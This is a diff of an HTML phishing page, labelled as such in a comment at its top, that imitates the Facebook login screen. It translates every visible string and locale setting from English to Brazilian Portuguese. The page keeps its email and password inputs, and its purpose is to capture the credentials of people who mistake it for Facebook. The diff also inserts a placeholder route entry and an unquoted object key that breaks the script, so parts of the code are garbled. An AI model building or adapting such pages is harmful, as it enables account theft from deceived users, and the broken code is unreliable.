@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
-<html lang="en" id="facebook">
+<html lang="pt-BR" id="facebook">
   <head>
     <meta charset="utf-8" />
     <meta
@@ -133,33 +133,26 @@
             ? performance.now() + performance.timing.navigationStart
             : new Date().getTime();
         }),
-        (CavalryLogger.prototype.measureResources = function () {}),
-        (CavalryLogger.prototype.profileEarlyResources = function () {}),
-        (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {}),
-        (CavalryLogger.start_js = function () {}),
-        (CavalryLogger.start_js_script = function () {}),
-        (CavalryLogger.done_js = function () {});
-      CavalryLogger.getInstance().setTTIEvent("t_domcontent");
-      (CavalryLogger.prototype.measureResources = function (a, b) {
-        if (!this.log_resources) return;
-        var c = "bootload/" + a.name;
-        if (
-          this.bootloader_metrics[c] !== void 0 ||
-          this.ongoing_watch[c] !== void 0
-        )
-          return;
-        var d = CavalryLogger.now();
-        this.ongoing_watch[c] = d;
-        "start_" + c in this.bootloader_metrics ||
-          (this.bootloader_metrics["start_" + c] = d);
-        b &&
-          !("tag_" + c in this.bootloader_metrics) &&
-          (this.bootloader_metrics["tag_" + c] = b);
-        if (a.type === "js") {
-          c = "js_exec/" + a.name;
+        (CavalryLogger.prototype.measureResources = function (a, b) {
+          if (!this.log_resources) return;
+          var c = "bootload/" + a.name;
+          if (
+            this.bootloader_metrics[c] !== void 0 ||
+            this.ongoing_watch[c] !== void 0
+          )
+            return;
+          var d = CavalryLogger.now();
           this.ongoing_watch[c] = d;
-        }
-      }),
+          "start_" + c in this.bootloader_metrics ||
+            (this.bootloader_metrics["start_" + c] = d);
+          b &&
+            !("tag_" + c in this.bootloader_metrics) &&
+            (this.bootloader_metrics["tag_" + c] = b);
+          if (a.type === "js") {
+            c = "js_exec/" + a.name;
+            this.ongoing_watch[c] = d;
+          }
+        }),
         (CavalryLogger.prototype.stopWatch = function (a) {
           if (this.ongoing_watch[a]) {
             var b = CavalryLogger.now(),
@@ -219,14 +212,14 @@
       href="https://facebook.com/data/manifest/"
       crossorigin="use-credentials"
     />
-    <title id="pageTitle">Facebook – log in or sign up</title>
+    <title id="pageTitle">Facebook – entrar ou cadastrar-se</title>
     <meta property="og:site_name" content="Facebook" />
     <meta property="og:url" content="https://www.facebook.com/" />
     <meta
       property="og:image"
       content="https://www.facebook.com/images/fb_icon_325x325.png"
     />
-    <meta property="og:locale" content="en_GB" />
+    <meta property="og:locale" content="pt_BR" />
     <link
       rel="alternate"
       media="only screen and (max-width: 640px)"
@@ -235,14 +228,14 @@
     <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
     <meta
       name="description"
-      content="Log in to Facebook to start sharing and connecting with your friends, family and people you know."
+      content="Faça login no Facebook para começar a compartilhar e se conectar com seus amigos, família e pessoas que você conhece."
     />
     <script type="application/ld+json" nonce="">
       {
         "\u0040context": "http:\/\/schema.org",
         "\u0040type": "WebSite",
         "name": "Facebook",
-        "url": "https:\/\/en-gb.facebook.com\/"
+        "url": "https:\/\/pt-br.facebook.com\/"
       }
     </script>
     <link rel="canonical" href="https://www.facebook.com/" />
@@ -828,94 +821,7 @@
                     "\/sem_campaigns\/sem_pixel_test\/": 1,
                     "\/bookmarks\/flyout\/body\/": 1,
                     "\/zero\/subno\/": 1,
-                    "\/confirmemail.php": 1,
-                    "\/policies\/": 1,
-                    "\/mobile\/internetdotorg\/classifier\/": 1,
-                    "\/zero\/dogfooding": 1,
-                    "\/xti.php": 1,
-                    "\/zero\/fblite\/config\/": 1,
-                    "\/hr\/zsh\/wc\/": 1,
-                    "\/ajax\/bootloader-endpoint\/": 1,
-                    "\/mobile\/zero\/carrier_page\/": 1,
-                    "\/mobile\/zero\/carrier_page\/education_page\/": 1,
-                    "\/mobile\/zero\/carrier_page\/feature_switch\/": 1,
-                    "\/mobile\/zero\/carrier_page\/settings_page\/": 1,
-                    "\/aloha_check_build": 1,
-                    "\/upsell\/zbd\/softnudge\/": 1,
-                    "\/mobile\/zero\/af_transition\/": 1,
-                    "\/mobile\/zero\/af_transition\/action\/": 1,
-                    "\/mobile\/zero\/freemium\/": 1,
-                    "\/mobile\/zero\/freemium\/redirect\/": 1,
-                    "\/mobile\/zero\/freemium\/zero_fup\/": 1,
-                    "\/privacy\/policy\/": 1,
-                    "\/privacy\/center\/": 1,
-                    "\/data\/manifest\/": 1,
-                    "\/4oh4.php": 1,
-                    "\/autologin.php": 1,
-                    "\/birthday_help.php": 1,
-                    "\/checkpoint\/": 1,
-                    "\/contact-importer\/": 1,
-                    "\/cr.php": 1,
-                    "\/legal\/terms\/": 1,
-                    "\/login.php": 1,
-                    "\/login\/": 1,
-                    "\/mobile\/account\/": 1,
-                    "\/n\/": 1,
-                    "\/remote_test_device\/": 1,
-                    "\/upsell\/buy\/": 1,
-                    "\/upsell\/buyconfirm\/": 1,
-                    "\/upsell\/buyresult\/": 1,
-                    "\/upsell\/promos\/": 1,
-                    "\/upsell\/continue\/": 1,
-                    "\/upsell\/h\/promos\/": 1,
-                    "\/upsell\/loan\/learnmore\/": 1,
-                    "\/upsell\/purchase\/": 1,
-                    "\/upsell\/promos\/upgrade\/": 1,
-                    "\/upsell\/buy_redirect\/": 1,
-                    "\/upsell\/loan\/buyconfirm\/": 1,
-                    "\/upsell\/loan\/buy\/": 1,
-                    "\/upsell\/sms\/": 1,
-                    "\/wap\/a\/channel\/reconnect.php": 1,
-                    "\/wap\/a\/nux\/wizard\/nav.php": 1,
-                    "\/wap\/appreg.php": 1,
-                    "\/wap\/birthday_help.php": 1,
-                    "\/wap\/c.php": 1,
-                    "\/wap\/confirmemail.php": 1,
-                    "\/wap\/cr.php": 1,
-                    "\/wap\/login.php": 1,
-                    "\/wap\/r.php": 1,
-                    "\/zero\/datapolicy": 1,
-                    "\/a\/timezone.php": 1,
-                    "\/a\/bz": 1,
-                    "\/bz\/reliability": 1,
-                    "\/r.php": 1,
-                    "\/mr\/": 1,
-                    "\/reg\/": 1,
-                    "\/registration\/log\/": 1,
-                    "\/terms\/": 1,
-                    "\/f123\/": 1,
-                    "\/expert\/": 1,
-                    "\/experts\/": 1,
-                    "\/terms\/index.php": 1,
-                    "\/terms.php": 1,
-                    "\/srr\/": 1,
-                    "\/msite\/redirect\/": 1,
-                    "\/fbs\/pixel\/": 1,
-                    "\/contactpoint\/preconfirmation\/": 1,
-                    "\/contactpoint\/cliff\/": 1,
-                    "\/contactpoint\/confirm\/submit\/": 1,
-                    "\/contactpoint\/confirmed\/": 1,
-                    "\/contactpoint\/login\/": 1,
-                    "\/preconfirmation\/contactpoint_change\/": 1,
-                    "\/help\/contact\/": 1,
-                    "\/survey\/": 1,
-                    "\/upsell\/loyaltytopup\/accept\/": 1,
-                    "\/settings\/": 1,
-                    "\/lite\/": 1,
-                    "\/zero_status_update\/": 1,
-                    "\/operator_store\/": 1,
-                    "\/upsell\/": 1,
-                    "\/wifiauth\/login\/": 1,
+                    "\/... etc ...": 1
                   },
                 },
                 1478,
@@ -1139,7 +1045,7 @@
                 1726,
               ],
               ["AdsInterfacesSessionConfig", [], {}, 2393],
-              ["IntlCurrentLocale", [], { code: "en_GB" }, 5954],
+              ["IntlCurrentLocale", [], { code: "pt_BR" }, 5954],
               [
                 "USIDMetadata",
                 [],
@@ -1224,13 +1130,13 @@
       );
     </script>
     <link
-      href="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yY/l/en_GB/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yY/l/pt_BR/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz"
       rel="preload"
       as="script"
       crossorigin="anonymous"
     />
     <script
-      src="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yY/l/en_GB/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz"
+      src="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yY/l/pt_BR/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz"
       async=""
       crossorigin="anonymous"
       data-bootloader-hash-client="jpW6YKq"
@@ -1349,25 +1255,25 @@
       data-bootloader-hash-client="Vlvz+ek"
     ></script>
     <link
-      href="https://static.xx.fbcdn.net/rsrc.php/v3iYXl4/yK/l/en_GB/ordclcpLBon.js?_nc_x=Ij3Wp8lg5Kz"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3iYXl4/yK/l/pt_BR/ordclcpLBon.js?_nc_x=Ij3Wp8lg5Kz"
       rel="preload"
       as="script"
       crossorigin="anonymous"
     />
     <script
-      src="https://static.xx.fbcdn.net/rsrc.php/v3iYXl4/yK/l/en_GB/ordclcpLBon.js?_nc_x=Ij3Wp8lg5Kz"
+      src="https://static.xx.fbcdn.net/rsrc.php/v3iYXl4/yK/l/pt_BR/ordclcpLBon.js?_nc_x=Ij3Wp8lg5Kz"
       async=""
       crossorigin="anonymous"
       data-bootloader-hash-client="BDpTGZx"
     ></script>
     <link
-      href="https://static.xx.fbcdn.net/rsrc.php/v3iS9S4/yv/l/en_GB/gsc_cV2tO3j.js?_nc_x=Ij3Wp8lg5Kz"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3iS9S4/yv/l/pt_BR/gsc_cV2tO3j.js?_nc_x=Ij3Wp8lg5Kz"
       rel="preload"
       as="script"
       crossorigin="anonymous"
     />
     <script
-      src="https://static.xx.fbcdn.net/rsrc.php/v3iS9S4/yv/l/en_GB/gsc_cV2tO3j.js?_nc_x=Ij3Wp8lg5Kz"
+      src="https://static.xx.fbcdn.net/rsrc.php/v3iS9S4/yv/l/pt_BR/gsc_cV2tO3j.js?_nc_x=Ij3Wp8lg5Kz"
       async=""
       crossorigin="anonymous"
       data-bootloader-hash-client="79Y8bmL"
@@ -1469,13 +1375,13 @@
       data-bootloader-hash-client="+jRpToS"
     ></script>
     <link
-      href="https://static.xx.fbcdn.net/rsrc.php/v3iX3c4/yw/l/en_GB/I4Y6I3ClX-_.js?_nc_x=Ij3Wp8lg5Kz"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3iX3c4/yw/l/pt_BR/I4Y6I3ClX-_.js?_nc_x=Ij3Wp8lg5Kz"
       rel="preload"
       as="script"
       crossorigin="anonymous"
     />
     <script
-      src="https://static.xx.fbcdn.net/rsrc.php/v3iX3c4/yw/l/en_GB/I4Y6I3ClX-_.js?_nc_x=Ij3Wp8lg5Kz"
+      src="https://static.xx.fbcdn.net/rsrc.php/v3iX3c4/yw/l/pt_BR/I4Y6I3ClX-_.js?_nc_x=Ij3Wp8lg5Kz"
       async=""
       crossorigin="anonymous"
       data-bootloader-hash-client="w3Wk9lz"
@@ -1494,7 +1400,7 @@
     ></script>
   </head>
   <body
-    class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_GB cores-lt4 _19_u hasAXNavMenubar"
+    class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_pt_BR cores-lt4 _19_u hasAXNavMenubar"
     dir="ltr"
   >
     <script type="text/javascript" nonce="">
@@ -1511,12 +1417,12 @@
         <div class="_608m">
           <div class="_5aj7 _tb6">
             <div class="_4bl7">
-              <span class="mrm _3bcv _50f3">Jump to</span>
+              <span class="mrm _3bcv _50f3">Ir para</span>
             </div>
             <div class="_4bl9 _3bcp">
               <div
                 class="_6a _608n"
-                aria-label="Navigation assistant"
+                aria-label="Assistente de navegação"
                 aria-keyshortcuts="Alt+/"
                 role="menubar"
                 id="u_0_5_LJ"
@@ -1531,7 +1437,7 @@
                     aria-expanded="false"
                     rel="toggle"
                     id="u_0_7_EV"
-                    ><span class="_55pe">Sections of this page</span
+                    ><span class="_55pe">Seções desta página</span
                     ><span class="_4o_3 _3-99"
                       ><i class="img sp_gMujFo71RwJ sx_a3bbbe"></i></span
                   ></a>
@@ -1548,7 +1454,7 @@
                     aria-expanded="false"
                     rel="toggle"
                     id="u_0_9_Ul"
-                    ><span class="_55pe">Accessibility help</span
+                    ><span class="_55pe">Ajuda de acessibilidade</span
                     ><span class="_4o_3 _3-99"
                       ><i class="img sp_gMujFo71RwJ sx_67944a"></i></span
                   ></a>
@@ -1557,8 +1463,8 @@
             </div>
             <div class="_4bl7 mlm pll _3bct">
               <div class="_6a _3bcy">
-                Press <span class="_3bcz">alt</span> +
-                <span class="_3bcz">/</span> to open this menu
+                Pressione <span class="_3bcz">alt</span> +
+                <span class="_3bcz">/</span> para abrir este menu
               </div>
             </div>
           </div>
@@ -1578,8 +1484,7 @@
                     />
                   </div>
                   <h2 class="_8eso">
-                    Facebook helps you connect and share with the people in your
-                    life.
+                    O Facebook ajuda você a se conectar e compartilhar com as pessoas da sua vida.
                   </h2>
                 </div>
                 <div class="_8esn">
@@ -1612,9 +1517,9 @@
                               name="email"
                               id="emailhidden"
                               data-testid="royal_email"
-                              placeholder="Email address or phone number"
+                              placeholder="Endereço de e-mail ou número de telefone"
                               autofocus="1"
-                              aria-label="Email address or phone number"
+                              aria-label="Endereço de e-mail ou número de telefone"
                             />
                           </div>
                           
@@ -1626,8 +1531,8 @@
                                 name="pass"
                                 id="pass"
                                 data-testid="royal_pass"
-                                placeholder="Password"
-                                aria-label="Password"
+                                placeholder="Senha"
+                                aria-label="Senha"
                               />
                               <input 
                                 type="hidden"
@@ -1663,13 +1568,13 @@
                             type="submit"
                             id="u_0_d_5u"
                           >
-                            Log In
+                            Entrar
                           </button>
                         </div>
                         <div class="_6ltj">
                           <a
                             href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1MTAwMjc1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login"
-                            >Forgotten password?</a
+                            >Esqueceu a senha?</a
                           >
                         </div>
                         <div class="_8icz"></div>
@@ -1682,7 +1587,7 @@
                             id="u_0_2_OT"
                             data-testid="open-registration-form-button"
                             rel="async"
-                            >Create New Account</a
+                            >Criar nova conta</a
                           >
                         </div>
                       </form>
@@ -1691,9 +1596,9 @@
                       <a
                         href="https://facebook.com/pages/create/?ref_type=registration_form"
                         class="_8esh"
-                        >Create a Page</a
+                        >Criar uma Página</a
                       >
-                      for a celebrity, brand or business.
+                      para uma celebridade, marca ou empresa.
                     </div>
                   </div>
                 </div>
@@ -1718,7 +1623,7 @@
                     class="_sv4"
                     dir="ltr"
                     href="https://bn-in.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("bn_IN", "en_GB", "https:\/\/bn-in.facebook.com\/", "www_list_selector", 0); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("bn_IN", "pt_BR", "https:\/\/bn-in.facebook.com\/", "www_list_selector", 0); return false;'
                     title="Bengali"
                     >বাংলা</a
                   >
@@ -1728,7 +1633,7 @@
                     class="_sv4"
                     dir="ltr"
                     href="https://as-in.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("as_IN", "en_GB", "https:\/\/as-in.facebook.com\/", "www_list_selector", 1); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("as_IN", "pt_BR", "https:\/\/as-in.facebook.com\/", "www_list_selector", 1); return false;'
                     title="Assamese"
                     >অসমীয়া</a
                   >
@@ -1738,7 +1643,7 @@
                     class="_sv4"
                     dir="ltr"
                     href="https://hi-in.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("hi_IN", "en_GB", "https:\/\/hi-in.facebook.com\/", "www_list_selector", 2); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("hi_IN", "pt_BR", "https:\/\/hi-in.facebook.com\/", "www_list_selector", 2); return false;'
                     title="Hindi"
                     >हिन्दी</a
                   >
@@ -1748,7 +1653,7 @@
                     class="_sv4"
                     dir="ltr"
                     href="https://ne-np.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("ne_NP", "en_GB", "https:\/\/ne-np.facebook.com\/", "www_list_selector", 3); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("ne_NP", "pt_BR", "https:\/\/ne-np.facebook.com\/", "www_list_selector", 3); return false;'
                     title="Nepali"
                     >नेपाली</a
                   >
@@ -1758,7 +1663,7 @@
                     class="_sv4"
                     dir="ltr"
                     href="https://id-id.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("id_ID", "en_GB", "https:\/\/id-id.facebook.com\/", "www_list_selector", 4); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("id_ID", "pt_BR", "https:\/\/id-id.facebook.com\/", "www_list_selector", 4); return false;'
                     title="Indonesian"
                     >Bahasa Indonesia</a
                   >
@@ -1768,7 +1673,7 @@
                     class="_sv4"
                     dir="rtl"
                     href="https://ar-ar.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("ar_AR", "en_GB", "https:\/\/ar-ar.facebook.com\/", "www_list_selector", 5); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("ar_AR", "pt_BR", "https:\/\/ar-ar.facebook.com\/", "www_list_selector", 5); return false;'
                     title="Arabic"
                     >العربية</a
                   >
@@ -1778,7 +1683,7 @@
                     class="_sv4"
                     dir="ltr"
                     href="https://zh-cn.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("zh_CN", "en_GB", "https:\/\/zh-cn.facebook.com\/", "www_list_selector", 6); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("zh_CN", "pt_BR", "https:\/\/zh-cn.facebook.com\/", "www_list_selector", 6); return false;'
                     title="Simplified Chinese (China)"
                     >中文(简体)</a
                   >
@@ -1788,7 +1693,7 @@
                     class="_sv4"
                     dir="ltr"
                     href="https://ms-my.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("ms_MY", "en_GB", "https:\/\/ms-my.facebook.com\/", "www_list_selector", 7); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("ms_MY", "pt_BR", "https:\/\/ms-my.facebook.com\/", "www_list_selector", 7); return false;'
                     title="Malay"
                     >Bahasa Melayu</a
                   >
@@ -1798,7 +1703,7 @@
                     class="_sv4"
                     dir="ltr"
                     href="https://es-la.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("es_LA", "en_GB", "https:\/\/es-la.facebook.com\/", "www_list_selector", 8); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("es_LA", "pt_BR", "https:\/\/es-la.facebook.com\/", "www_list_selector", 8); return false;'
                     title="Spanish"
                     >Español</a
                   >
@@ -1808,7 +1713,7 @@
                     class="_sv4"
                     dir="ltr"
                     href="https://pt-br.facebook.com/"
-                    onclick='require("IntlUtils").setCookieLocale("pt_BR", "en_GB", "https:\/\/pt-br.facebook.com\/", "www_list_selector", 9); return false;'
+                    onclick='require("IntlUtils").setCookieLocale("pt_BR", "pt_BR", "https:\/\/pt-br.facebook.com\/", "www_list_selector", 9); return false;'
                     title="Portuguese (Brazil)"
                     >Português (Brasil)</a
                   >
@@ -1820,7 +1725,7 @@
                     rel="dialog"
                     ajaxify="https://facebook.com/settings/language/language/?uri=https%3A%2F%2Fpt-br.facebook.com%2F&amp;source=www_list_selector_more"
                     href="#"
-                    title="Show more languages"
+                    title="Mostrar mais idiomas"
                     ><i class="img sp_gMujFo71RwJ sx_25f620"></i
                   ></a>
                 </li>
@@ -1829,57 +1734,57 @@
               <div
                 id="pageFooterChildren"
                 role="contentinfo"
-                aria-label="Facebook site links"
+                aria-label="Links do site Facebook"
               >
                 <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                   <li>
-                    <a href="https://facebook.com/reg/" title="Sign up for Facebook">Sign Up</a>
+                    <a href="https://facebook.com/reg/" title="Cadastre-se no Facebook">Cadastre-se</a>
                   </li>
                   <li>
-                    <a href="https://facebook.com/login/" title="Log in to Facebook">Log In</a>
+                    <a href="https://facebook.com/login/" title="Entrar no Facebook">Entrar</a>
                   </li>
                   <li>
                     <a
                       href="https://messenger.com/"
-                      title="Take a look at Messenger."
+                      title="Confira o Messenger"
                       >Messenger</a
                     >
                   </li>
                   <li>
-                    <a href="https://facebook.com/lite/" title="Facebook Lite for Android."
+                    <a href="https://facebook.com/lite/" title="Facebook Lite para Android"
                       >Facebook Lite</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://www.facebook.com/watch/"
-                      title="Browse our Watch videos."
-                      >Watch</a
+                      title="Assista aos nossos vídeos"
+                      >Assistir</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/places/"
-                      title="Take a look at popular places on Facebook."
-                      >Places</a
+                      title="Confira locais populares no Facebook"
+                      >Locais</a
                     >
                   </li>
                   <li>
-                    <a href="https://facebook.com/games/" title="Check out Facebook games."
-                      >Games</a
+                    <a href="https://facebook.com/games/" title="Confira jogos do Facebook"
+                      >Jogos</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/marketplace/"
-                      title="Buy and sell on Facebook Marketplace."
+                      title="Compre e venda no Facebook Marketplace"
                       >Marketplace</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://pay.facebook.com/"
-                      title="Learn more about Facebook Pay"
+                      title="Saiba mais sobre o Facebook Pay"
                       target="_blank"
                       >Facebook Pay</a
                     >
@@ -1887,7 +1792,7 @@
                   <li>
                     <a
                       href="https://www.oculus.com/"
-                      title="Learn more about Oculus"
+                      title="Saiba mais sobre o Oculus"
                       target="_blank"
                       >Oculus</a
                     >
@@ -1895,7 +1800,7 @@
                   <li>
                     <a
                       href="https://portal.facebook.com/"
-                      title="Learn more about Facebook Portal"
+                      title="Saiba mais sobre o Facebook Portal"
                       target="_blank"
                       >Portal</a
                     >
@@ -1903,7 +1808,7 @@
                   <li>
                     <a
                       href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT0zw08aXOsG2RBnp0K0lmebgUjYmgcn92w5Ug0m3hvzjE6pCqxJDz74mhFo2IGbDMjvblpQStyU7fS1j_XJV1TGIiH8_ifdO2KYq4DewlkF9r-Un-pn5p_pKYR1jorXrfW8TOB1v3zWEyI68ZQnng"
-                      title="Take a look at Instagram"
+                      title="Confira o Instagram"
                       target="_blank"
                       rel="noopener nofollow"
                       data-lynx-mode="asynclazy"
@@ -1913,89 +1818,89 @@
                   <li>
                     <a
                       href="https://www.bulletin.com/"
-                      title="Take a look at Bulletin newsletter"
+                      title="Confira a newsletter Bulletin"
                       >Bulletin</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/local/lists/245019872666104/"
-                      title="Browse our Local Lists directory."
+                      title="Confira nosso diretório de listas locais"
                       >Local</a
                     >
                   </li>
                   <li>
-                    <a href="https://facebook.com/fundraisers/" title="Donate to worthy causes."
-                      >Fundraisers</a
+                    <a href="https://facebook.com/fundraisers/" title="Doe para causas nobres"
+                      >Arrecadações</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/biz/directory/"
-                      title="Browse our Facebook Services directory."
-                      >Services</a
+                      title="Confira nosso diretório de serviços do Facebook"
+                      >Serviços</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
-                      title="See the Voting Information Centre"
-                      >Voting Information Centre</a
+                      title="Confira o Centro de Informações sobre Votação"
+                      >Central de Informações sobre Votação</a
                     >
                   </li>
                   <li>
-                    <a href="https://facebook.com/groups/explore/" title="Explore our groups."
-                      >Groups</a
+                    <a href="https://facebook.com/groups/explore/" title="Explore nossos grupos"
+                      >Grupos</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://about.facebook.com/"
                       accesskey="8"
-                      title="Read our blog, discover the resource centre and find job opportunities."
-                      >About</a
+                      title="Leia nosso blog, descubra o centro de recursos e encontre oportunidades de emprego"
+                      >Sobre</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
-                      title="Advertise on Facebook"
-                      >Create ad</a
+                      title="Anunciar no Facebook"
+                      >Criar anúncio</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/pages/create/?ref_type=site_footer"
-                      title="Create a Page"
-                      >Create Page</a
+                      title="Criar uma Página"
+                      >Criar Página</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://developers.facebook.com/?ref=pf"
-                      title="Develop on our platform."
-                      >Developers</a
+                      title="Desenvolva em nossa plataforma"
+                      >Desenvolvedores</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/careers/?ref=pf"
-                      title="Make your next career move to our brilliant company."
-                      >Careers</a
+                      title="Faça sua próxima mudança de carreira em nossa empresa"
+                      >Carreiras</a
                     >
                   </li>
                   <li>
                     <a
                       data-nocookies="1"
                       href="https://facebook.com/privacy/explanation/"
-                      title="Learn about your privacy and Facebook."
-                      >Privacy</a
+                      title="Saiba sobre sua privacidade e o Facebook"
+                      >Privacidade</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/policies/cookies/"
-                      title="Learn about cookies and Facebook."
+                      title="Saiba sobre cookies e o Facebook"
                       data-nocookies="1"
                       >Cookies</a
                     >
@@ -2005,7 +1910,7 @@
                       class="_41ug"
                       data-nocookies="1"
                       href="https://www.facebook.com/help/568137493302217"
-                      title="Learn about AdChoices."
+                      title="Saiba sobre AdChoices"
                       >AdChoices<i class="img sp_gMujFo71RwJ sx_bdef52"></i
                     ></a>
                   </li>
@@ -2014,16 +1919,16 @@
                       data-nocookies="1"
                       href="https://facebook.com/policies?ref=pf"
                       accesskey="9"
-                      title="Review our terms and policies."
-                      >Terms</a
+                      title="Reveja nossos termos e políticas"
+                      >Termos</a
                     >
                   </li>
                   <li>
                     <a
                       href="https://facebook.com/help/?ref=pf"
                       accesskey="0"
-                      title="Visit our Help Centre."
-                      >Help</a
+                      title="Visite nosso Centro de Ajuda"
+                      >Ajuda</a
                     >
                   </li>
                   <li>
@@ -2031,8 +1936,8 @@
                       accesskey="6"
                       class="accessible_elem"
                       href="https://facebook.com/settings"
-                      title="View and edit your Facebook settings."
-                      >Settings</a
+                      title="Visualize e edite suas configurações do Facebook"
+                      >Configurações</a
                     >
                   </li>
                   <li>
@@ -2040,14 +1945,14 @@
                       accesskey="7"
                       class="accessible_elem"
                       href="https://facebook.com/allactivity?privacy_source=activity_log_top_menu"
-                      title="View your activity log"
-                      >Activity log</a
+                      title="Visualize seu registro de atividade"
+                      >Registro de atividade</a
                     >
                   </li>
                 </ul>
               </div>
               <div class="mvl copyright">
-                <div><span> Meta © 2022</span></div>
+                <div><span>Meta © 2022</span></div>
               </div>
             </div>
           </div>
@@ -2128,7 +2033,7 @@
             },
             jpW6YKq: {
               type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ij9m4\/yY\/l\/en_GB\/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz",
+              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ij9m4\/yY\/l\/pt_BR\/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz",
             },
             VdF6ypd: {
               type: "js",
@@ -2136,7 +2041,7 @@
             },
             "79Y8bmL": {
               type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iS9S4\/yv\/l\/en_GB\/gsc_cV2tO3j.js?_nc_x=Ij3Wp8lg5Kz",
+              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iS9S4\/yv\/l\/pt_BR\/gsc_cV2tO3j.js?_nc_x=Ij3Wp8lg5Kz",
             },
             GKQxLch: {
               type: "js",
@@ -2158,439 +2063,23 @@
               type: "js",
               src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/w-Pc7DjVMKP.js?_nc_x=Ij3Wp8lg5Kz",
             },
-            TNzeBoy: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3imhw4\/yv\/l\/en_GB\/mNBWBp-7bhm.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            w3Wk9lz: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iX3c4\/yw\/l\/en_GB\/I4Y6I3ClX-_.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "zA+yJGG": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iW4s4\/yS\/l\/en_GB\/mr8_Iyxpev9.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "2\/maQ\/Q": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/r\/R9lc5DaDrGJ.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            vhw5GRt: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yy\/r\/oXa106O6DQc.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            pndjTvI: {
+            P/mr5VE: {
               type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yB\/l\/0,cross\/QeLb7uUDzQU.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            R0lSirj: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/9rqFBr5eUp5.js?_nc_x=Ij3Wp8lg5Kz",
+              src: "data:text\/css; charset=utf-8,\u002523bootloader_P_mr5VE{height:42px;}.bootloader_P_mr5VE{display:block!important;}",
+              nc: 1,
+              d: 1,
             },
             CGkH4FY: {
               type: "js",
